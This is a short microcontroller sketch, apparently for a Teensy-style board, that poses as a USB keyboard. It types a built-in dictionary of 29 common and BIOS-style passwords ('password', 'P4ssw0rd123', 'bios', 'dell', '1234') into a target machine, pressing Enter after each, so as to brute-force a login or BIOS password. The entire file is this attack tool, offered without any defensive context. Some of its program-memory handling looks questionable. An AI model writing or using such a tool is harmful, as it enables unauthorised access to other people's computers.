#include <avr/pgmspace.h>

void passwordTest(const char* password)
{
  delay(150);
  Keyboard.print(password);
  delay(500);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  
  Keyboard.set_key1(0);
  Keyboard.send_now();
  
  delay(500);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void setup() {
  delay(1000);
}

void loop() {
  int i;

prog_char pass0[] PROGMEM = "pass";
prog_char pass1[] PROGMEM = "p4ss";
prog_char pass2[] PROGMEM = "Pass";
prog_char pass3[] PROGMEM = "P4ss";
prog_char pass4[] PROGMEM = "password";
prog_char pass5[] PROGMEM = "p4ssword";
prog_char pass6[] PROGMEM = "passw0rd";
prog_char pass7[] PROGMEM = "p4ssw0rd";
prog_char pass8[] PROGMEM = "Password";
prog_char pass9[] PROGMEM = "Passw0rd";
prog_char pass10[] PROGMEM = "P4ssw0rd";
prog_char pass11[] PROGMEM = "pass123";
prog_char pass12[] PROGMEM = "p4ss123";
prog_char pass13[] PROGMEM = "Pass123";
prog_char pass14[] PROGMEM = "P4ss123";
prog_char pass15[] PROGMEM = "password123";
prog_char pass16[] PROGMEM = "p4ssword123";
prog_char pass17[] PROGMEM = "passw0rd123";
prog_char pass18[] PROGMEM = "p4ssw0rd123";
prog_char pass19[] PROGMEM = "Password123";
prog_char pass20[] PROGMEM = "Passw0rd123";
prog_char pass21[] PROGMEM = "P4ssw0rd123";
prog_char pass22[] PROGMEM = "bios";
prog_char pass23[] PROGMEM = "bi0s";
prog_char pass24[] PROGMEM = "bios123";
prog_char pass25[] PROGMEM = "dell";
prog_char pass26[] PROGMEM = "del123";
prog_char pass27[] PROGMEM = "123456";
prog_char pass28[] PROGMEM = "1234";


PROGMEM const char *dico[] =
{
pass0,
pass1,
pass2,
pass3,
pass4,
pass5,
pass6,
pass7,
pass8,
pass9,
pass10,
pass11,
pass12,
pass13,
pass14,
pass15,
pass16,
pass17,
pass18,
pass19,
pass20,
pass21,
pass22,
pass23,
pass24,
pass25,
pass26,
pass27,
pass28};

for (i=0 ; i < 29; i++)  {
    passwordTest(dico[i]);
    delay(1000);
  }
}